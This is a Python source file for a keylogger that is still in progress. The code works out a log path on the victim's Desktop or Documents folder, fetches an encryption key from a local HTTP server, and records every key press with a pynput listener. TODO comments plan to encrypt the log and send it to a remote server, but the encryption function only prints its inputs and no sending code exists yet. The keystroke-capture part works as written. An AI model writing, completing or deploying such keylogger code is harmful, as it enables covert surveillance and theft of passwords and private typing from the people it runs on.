# TODO: Function to encrypt keylogger.txt
# TODO: Function to send keylogger data to remote server
# TODO: Script to decrypt keylogger.txt

from pynput.keyboard import Listener
import os
import logging
import platform
import requests
from cryptography.fernet import Fernet


def get_filepath():
    username = os.getlogin()
    log_name = 'keylogger.txt'
    if platform.system() == 'Windows':
        return "C:\\Users\\{}\\Desktop\\{}".format(username, log_name)
    elif platform.system() == 'Darwin':
        return '/Users/{}/Desktop/{}'.format(username, log_name)
    else:
        return '/home/{}/Documents/{}'.format(username, log_name)


def get_key():
    url = 'http://localhost:8080/mykey.key'
    f = requests.get(url)
    key = f.text.rstrip("\n")
    return key


def encrypt_file(file, key):
    print(file)
    print(key)


def key_handler(key):
    logging.info(key)


def run():
    key = get_key()
    log_dir = get_filepath()
    encrypt_file(log_dir, key)
    #logging.basicConfig(filename="{}".format(get_filepath()), level=logging.DEBUG, format="%(asctime)s: %(message)s")
    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s: %(message)s")
    with Listener(on_press=key_handler) as listener:
        listener.join()


if __name__ == '__main__':
    run()
